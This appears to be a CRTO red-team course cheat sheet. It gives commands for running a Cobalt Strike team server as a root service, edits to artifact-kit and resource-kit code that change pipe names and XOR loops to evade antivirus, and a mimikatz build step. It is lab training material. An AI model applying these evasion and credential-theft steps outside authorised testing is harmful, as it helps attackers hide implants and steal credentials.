# CRTO Cheat Sheet
## Setup Team Server as a Service

`sudo vim /etc/systemd/system/teamserver.service`

*include in teamserver.service:*
`[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/nopsled.profile

[Install]
WantedBy=multi-user.target`

`sudo systemctl daemon-reload`
`sudo systemctl status teamserver.service`
`sudo systemctl start teamserver.service`
`sudo systemctl enable teamserver.service`

## Change sprinf in bypass-pipe.c line 130 and remove comments before
`sprintf(pipename, "%c%c%c%c%c%c%c%c%cnop\\sled", 92, 92, 46, 92, 112, 105, 112, 101, 92);`

## Change for loop body line 45
`for (x = 0; x < length; x++) {
    char* ptr = (char *)buffer + x;

    /* do something random */
    GetTickCount();

    *ptr = *ptr ^ key[x % 8];
}`

## Build artifact kit
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact && ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts`

## Build resource kit
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource && ./build.sh /mnt/c/Tools/cobaltstrike/resource`
### Edit template.x64.ps1
`for ($nops = 0; $nops -lt $v_code.Count; $nops++) {
	$v_code[$nops] = $v_code[$nops] -bxor 35
}`
### Build resource kit again
`./build.sh /mnt/c/Tools/cobaltstrike/resource`

## Setup mimikatz for CS
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/mimikatz/ && ./build.sh /mnt/c/Tools/cobaltstrike/mimikatz`